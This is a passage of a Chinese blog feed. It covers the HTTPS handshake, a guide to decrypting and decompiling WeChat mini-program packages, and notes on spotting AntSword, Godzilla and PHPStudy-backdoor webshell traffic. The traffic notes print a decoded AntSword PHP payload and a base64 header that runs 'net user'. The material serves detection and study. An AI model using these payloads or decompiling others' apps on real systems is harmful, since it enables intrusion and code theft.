6.公钥证书认证及其使用</h4><p>证书除了能判明服务器是否安全，还能用来确认运行服务器背后的公司是否是合法合规、真实存在的。拥有这个特性的证书就是 EV SSL 证书（Extended Validation SSLCertificate）。EV SSL 证书是基于国际标准的认证指导方针颁发的证书。其严格规定了对运营组织是否真实的确认方针，因此，通过认证的 Web 网站能够获得更高的认可度。持有该证书的 WEB 网站一般在地址栏有一些显眼的标志，例如地址栏是绿色的或者有个锁头一样的标志。</p><p>不但服务器能拥有数字证书，客户端同样能，其获取方式与服务器证书如出一辙。但是，客户端证书的获取需要支付一定的费用，所以一般情况下比较少用。</p><p>除了上述具有公信力的认证证书，还有一种自签名证书，这种证书通常有自由认证机构颁发，不过在互联网上无法使用，不具备公信力。如果你想自由生成证书，则 OpenSSL 这套开源程序能够帮助你。</p><p><a name="b54827a2"></a></p><h3 id="HTTPS-的通讯机制"><a href="#HTTPS-的通讯机制" class="headerlink" title="HTTPS 的通讯机制"></a>HTTPS 的通讯机制</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913704418-20dda70b-5049-4b15-a23d-32d627206119.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913704418-20dda70b-5049-4b15-a23d-32d627206119.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="HTTPS的安全通信机制.png"></p><p><a name="20e729e5"></a></p><h4 id="图-7-HTTPS-的安全通信机制"><a href="#图-7-HTTPS-的安全通信机制" class="headerlink" title="图 7.HTTPS 的安全通信机制"></a>图 7.HTTPS 的安全通信机制</h4><p>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p><p>步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p><p>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p><p>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p><p>步骤 5: SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p><p>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p><p>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p><p>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</p><p>步骤 9： 服务器同样发送 Finished 报文。</p><p>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p><p>步骤 11： 应用层协议通信，即发送 HTTP 响应。步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p><p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。</p><p><a name="59ce014c"></a></p><h3 id="HTTPS-的一些缺点"><a href="#HTTPS-的一些缺点" class="headerlink" title="HTTPS 的一些缺点"></a>HTTPS 的一些缺点</h3><p>HTTPS 固然能大幅提升安全性，但是带来的代价便是资源的消耗，运行算法加密和解密需要一定的 CPU 运算力和内存，访问量越大的网站需要付出的硬件资源越大。一般来说，只会在传输重要信息时才使用 HTTPS 协议，例如用户账号密码、银行卡号密码等等，而其它时候直接使用 HTTP 协议进行通信，这样就能在尽可能保证服务器资源合理的情况下保证信息安全。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序抓包与反编译</title>
      <link href="/2023/06/29/frontend/security/wei-xin-xiao-cheng-xu-zhua-bao-yu-fan-bian-yi/"/>
      <url>/2023/06/29/frontend/security/wei-xin-xiao-cheng-xu-zhua-bao-yu-fan-bian-yi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="NKnKx"></a></p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>首先我们这里的要准备一个安卓模拟器，这里我用的雷电模拟器，这个也可以用其他的模拟器可以自行选择。</p><p>在模拟器上下载微信并登录之后找到对应的⼩程序点击打开即可（因为兼容性问题，在 安卓模拟器中微信⼩程序可能会闪退，但这并不影响后续操作，⼩程序数据包已经成⾃带下载了）。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707149784-dba28ff3-011c-4b2d-bf9b-e4841a392187.png#height=953&id=INAhw&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=556" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707149784-dba28ff3-011c-4b2d-bf9b-e4841a392187.png#height=953&id=INAhw&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=556" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707179436-5132da03-a99f-473f-b386-21e9766e7393.png#height=958&id=OYw2v&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=559" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707179436-5132da03-a99f-473f-b386-21e9766e7393.png#height=958&id=OYw2v&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=559" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707230779-2824a3a0-3205-4811-b5d6-18b0023df4f0.png#height=949&id=u1YTt&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=554" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707230779-2824a3a0-3205-4811-b5d6-18b0023df4f0.png#height=949&id=u1YTt&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=554" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707282038-e2ed1a03-8a56-469c-b834-f5c2bcd5195f.png#height=272&id=GAGyS&originHeight=272&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=506" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707282038-e2ed1a03-8a56-469c-b834-f5c2bcd5195f.png#height=272&id=GAGyS&originHeight=272&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=506" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>接 着我们便能在安卓保存路径：&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;{⽤户 ID}&#x2F;appbrand&#x2F;pkg&#x2F; 下；iOS 保存路径：&#x2F;var&#x2F;mobile&#x2F;Containers&#x2F;Data&#x2F;Application&#x2F;{程序 UUID}&#x2F;Library&#x2F;WechatPrivate&#x2F;{⽤户 ID}&#x2F;WeApp&#x2F;LocalCache&#x2F;release&#x2F;{⼩程序 ID}&#x2F; ）下找到⼩程 序包。</p><p>接着找到上面的路径，然后全部选择。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707339351-dde4c306-4315-4ea8-b26a-dec9062e9b6c.png#height=298&id=eVzlO&originHeight=800&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=612" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707339351-dde4c306-4315-4ea8-b26a-dec9062e9b6c.png#height=298&id=eVzlO&originHeight=800&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=612" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707358171-ae4c2691-6d7a-430a-a78d-39e43f889c09.png#height=135&id=sx6Ma&originHeight=334&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=609" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707358171-ae4c2691-6d7a-430a-a78d-39e43f889c09.png#height=135&id=sx6Ma&originHeight=334&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=609" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>选择以后点击打开安卓文件夹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707392917-7211240e-614c-49b0-b7cf-bb70c9b11421.png#height=301&id=u00jc&originHeight=605&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=593" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707392917-7211240e-614c-49b0-b7cf-bb70c9b11421.png#height=301&id=u00jc&originHeight=605&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=593" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707406928-af011a4b-b0e8-4885-b6f8-23a8316443b5.png#height=249&id=AaGHI&originHeight=495&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=601" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707406928-af011a4b-b0e8-4885-b6f8-23a8316443b5.png#height=249&id=AaGHI&originHeight=495&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=601" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707423631-a3c68687-4b85-492c-990e-77a0524f1027.png#height=237&id=kGmqc&originHeight=314&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=605" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707423631-a3c68687-4b85-492c-990e-77a0524f1027.png#height=237&id=kGmqc&originHeight=314&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=605" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />然后就能看到它被提取出来了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707469990-53c25fe7-4a33-4bbe-94df-71b5b06cd20a.png#height=128&id=qqsFV&originHeight=147&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=598" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707469990-53c25fe7-4a33-4bbe-94df-71b5b06cd20a.png#height=128&id=qqsFV&originHeight=147&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=598" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>这⾥我们使⽤ wxappUnpacker 解包⼯具（下载地址：<a href="https://data.hackinn.com/tools/wxappUnpacker.zip()%E8%AE%B0%E4%BD%8F%E8%BF%99%E9%87%8C%E5%A4%8D%E5%88%B6%E5%88%B0%E8%BF%85%E9%9B%B7%E9%87%8C%E9%9D%A2%E6%89%93%E5%BC%80%E4%B8%8B%E8%BD%BD">https://data.hackinn.com/tools/wxappUnpacker.zip(</a>，此下载包为⼆次优化版本），直接使⽤“node wuWxapkg.js ⼩程序包名”命令即可⼀键解包（需 提前安装 node.js 及其他组件，详⻅包内使⽤说明），⾮常⽅便：[nodejs 安装]</p><p>然后解包</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707611974-8ff738b8-bbf1-40be-9066-caaf6a24a4e7.png#height=280&id=VhPg8&originHeight=551&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=613" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707611974-8ff738b8-bbf1-40be-9066-caaf6a24a4e7.png#height=280&id=VhPg8&originHeight=551&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=613" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>最后把提取出来的文件夹放在微信开发者工具里就可以分析了.     [微信开发者工具下载] (<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html</a>)</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707700826-4d0c9cf0-053f-4048-b79b-41141daeb2e6.png#height=421&id=Qqrju&originHeight=1030&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=641" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12914254/1617707700826-4d0c9cf0-053f-4048-b79b-41141daeb2e6.png#height=421&id=Qqrju&originHeight=1030&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=641" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="DyoZD"></a></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><a name="SaFia"></a></p><h3 id="环境工具准备"><a href="#环境工具准备" class="headerlink" title="环境工具准备"></a>环境工具准备</h3><ul><li>node.js 运行环境</li><li>小程序解密脚本</li><li>反编脚本</li><li>微信小程序开发者工具</li></ul><p>以上工具打包分享<br />链接: <a href="https://pan.baidu.com/s/1SE9uNu5Yxwwmbpw1ils0oA?pwd=zzy6">https://pan.baidu.com/s/1SE9uNu5Yxwwmbpw1ils0oA?pwd=zzy6</a> 提取码: zzy6</p><p>下载工具包后进行解压首先安装 node.js 环境，安装完成后通过 cmd 运行 <strong>node -v</strong> 和 <strong>npm -v</strong>查看版本是否安装成功。</p><p>[<img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639272861-df46fd3c-f05d-4ce9-a180-f9214905a2b6.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639272861-df46fd3c-f05d-4ce9-a180-f9214905a2b6.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="w7FTy"></a></p><h3 id="小程序包下载"><a href="#小程序包下载" class="headerlink" title="小程序包下载"></a>小程序包下载</h3><p>PC 端和手机端小程序在运行时会将程序包缓存到本地，但是程序包经过了加密，我们不能够直接进行反编解包，这里我们需要首先对小程序包进行解密后才能够对其进行反编。<br />小程序包的解密首先需要找到小程序包缓存到本地的位置，这里以 PC 端为例不演示手机端。打开微信设置-文件管理，打开下图中的路径找到下图路径中 WeChat Files 文件夹。默认微信缓存文件在系统 C 盘用户文档目录下，我这里微信缓存位置做了修改。<br />[<img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639272851-f1e9063f-a9aa-47d7-a9c5-225804733b59.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639272851-f1e9063f-a9aa-47d7-a9c5-225804733b59.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />第二种方法更为简单，我们直接将 Applet 文件夹下的所有小程序缓存包删除掉，再访问一次将要准备反编的小程序，这时 Applet 下就只有这一个小程序的缓存包了，简单粗暴哈哈哈。<br><a name="oOy7j"></a></p><h3 id="小程序包解密"><a href="#小程序包解密" class="headerlink" title="小程序包解密"></a>小程序包解密</h3><p>下面我们就使用小程序包解密工具对包进行解密，解压小程序包解密工具如下图运行 UnpackMiniApp.exe<br />[<img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639274132-19e71276-1c64-417d-83b9-cecb828cfacb.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639274132-19e71276-1c64-417d-83b9-cecb828cfacb.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />解密成功后输出到 wxpack 文件夹下，文件格式不变。<br><a name="obXaU"></a></p><h3 id="小程序包反编译"><a href="#小程序包反编译" class="headerlink" title="小程序包反编译"></a>小程序包反编译</h3><p>经过解密后的的包格式依然是 **.wxapkg **,下一步我们需要对包进行反编译就可以获取小程序的源代码。<br />我们使用中的 <strong>wxappUnpacker</strong> 脚本对其进行反编译。步骤如下：<br />解压 <strong>wxappunpacker</strong> 进入这个目录后在目录下运行 <strong>cmd</strong> 执行命令<br />node wuWxapkg.js D:\小程序包解密\wxpack\wx8f446acf8c4a85f5.wxapkg ## 其中 D:\小程序包解密\wxpack\wx8f446acf8c4a85f5.wxapkg 为解密后的小程序包路径位置 <br />[<img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639275679-8d1844a2-4302-4fe5-a7b7-06a0bee71005.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639275679-8d1844a2-4302-4fe5-a7b7-06a0bee71005.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="dsKeo"></a></p><h3 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h3><p>完成解密和反编后我们已经获取到了小程序包的源码，最后我们可以使用微信小程序开发工具进行编辑开发或查看审阅源码。<br />在我分享的工具包中提供了 win64 版本的微信小程序开发工具安装包，如需不同版本的安装包也可自行到微信开发者官方网页进行下载<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html</a><br />安装完成后我们运行工具使用游客模式登录<br />[<img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639277278-baf61c10-adeb-4270-83a8-0b70da512c2e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663639277278-baf61c10-adeb-4270-83a8-0b70da512c2e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />我在前面有提到手机端的微信小程序，实际上手机端和 PC 端的小程序包都是相同格式的只要我们找到手机小程序包缓存位置将包导出到电脑中也可进行反编，在 PC 端进行反编相对于从手机提取小程序包要方便一些。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意流量特征分析</title>
      <link href="/2023/06/29/frontend/security/e-yi-liu-liang-te-zheng-fen-xi/"/>
      <url>/2023/06/29/frontend/security/e-yi-liu-liang-te-zheng-fen-xi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="JcLp8"></a></p><h1 id="分析工具："><a href="#分析工具：" class="headerlink" title="分析工具："></a>分析工具：</h1><p>Wireshark,在线解密网站</p><p><a name="4qvXc"></a></p><h1 id="蚁剑的流量特征"><a href="#蚁剑的流量特征" class="headerlink" title="蚁剑的流量特征"></a>蚁剑的流量特征</h1><ul><li>UA：antSword&#x2F;v2.1</li><li>请求数据：key&#x3D;(一段加密的内容)</li><li>返回数据通常为请求数据解密后执行的命令<br><a name="BHpX4"></a></li></ul><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617429543805-ff9df0d4-fc7f-44d3-90cf-fa80d4c59b89.png#height=520&id=sKwJM&originHeight=788&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88503&status=done&style=none&title=&width=565" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617429543805-ff9df0d4-fc7f-44d3-90cf-fa80d4c59b89.png#height=520&id=sKwJM&originHeight=788&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88503&status=done&style=none&title=&width=565" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />如图，根据 HTTP 流分析，UA 为 antSword&#x2F;v2.1,将请求数据进行 URL 解密后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;0f07cc1a1&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;020ae6da1ca4&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>)<span class="variable">$D</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;&quot;</span>;<span class="variable">$u</span>=(<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>))?@<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()):<span class="string">&quot;&quot;</span>;<span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@<span class="title function_ invoke__">get_current_user</span>();<span class="variable">$R</span>.=<span class="title function_ invoke__">php_uname</span>();<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;<span class="keyword">echo</span> <span class="variable">$R</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p><a name="0rAFD"></a></p><h1 id="哥斯拉的流量特征"><a href="#哥斯拉的流量特征" class="headerlink" title="哥斯拉的流量特征"></a>哥斯拉的流量特征</h1><ul><li>通常 POST 请求，没有 GET 请求</li><li>大部分 payload 使用 AES 加密，php 使用异或加密</li><li>服务器返回的 Content-Length 为 0</li><li>请求的数据中都含有密码”pass&#x3D;”<br><a name="hkNfV"></a></li></ul><h3 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617434376385-7e33891f-be15-49b5-8b74-a139b1306bae.png#height=451&id=azCJU&originHeight=515&originWidth=476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36628&status=done&style=none&title=&width=417" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617434376385-7e33891f-be15-49b5-8b74-a139b1306bae.png#height=451&id=azCJU&originHeight=515&originWidth=476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36628&status=done&style=none&title=&width=417" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />请求包：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617432885975-ab53ae52-cd61-48db-8219-f733f970bdef.png#height=583&id=bdElw&originHeight=902&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197228&status=done&style=none&title=&width=551" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617432885975-ab53ae52-cd61-48db-8219-f733f970bdef.png#height=583&id=bdElw&originHeight=902&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197228&status=done&style=none&title=&width=551" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />返回包：Content-Length:0<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617432951887-4776ebfa-ebaf-4b2e-a342-74f351eebc5d.png#height=169&id=rTDFr&originHeight=213&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22698&status=done&style=none&title=&width=599" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617432951887-4776ebfa-ebaf-4b2e-a342-74f351eebc5d.png#height=169&id=rTDFr&originHeight=213&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22698&status=done&style=none&title=&width=599" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="oYIwx"></a></p><h1 id="PHPstudy-后门的流量特征"><a href="#PHPstudy-后门的流量特征" class="headerlink" title="PHPstudy 后门的流量特征"></a>PHPstudy 后门的流量特征</h1><ul><li>Accept-Charset 字段中有着其不该有的值<br><a name="s5z3W"></a></li></ul><h3 id="实例：-2"><a href="#实例：-2" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617433070896-719de29f-b19b-47fd-a10e-9a404205277a.png#height=349&id=Ekjqn&originHeight=541&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41635&status=done&style=none&title=&width=551" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617433070896-719de29f-b19b-47fd-a10e-9a404205277a.png#height=349&id=Ekjqn&originHeight=541&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41635&status=done&style=none&title=&width=551" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />Accpet-Charset 字段中的内容：<br /><code>c3lzdGVtKCJuZXQgdXNlciIpOw==</code><br />Base64 解密后：<br /><code>system(&quot;net user&quot;);</code><br />返回包的数据：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617545340644-bfde3847-371a-470c-a38e-ff41644b8176.png#height=242&id=xv0f7&originHeight=281&originWidth=677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15195&status=done&style=none&title=&width=583" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617545340644-bfde3847-371a-470c-a38e-ff41644b8176.png#height=242&id=xv0f7&originHeight=281&originWidth=677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15195&status=done&style=none&title=&width=583" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="hMHo3"></a></p><h1 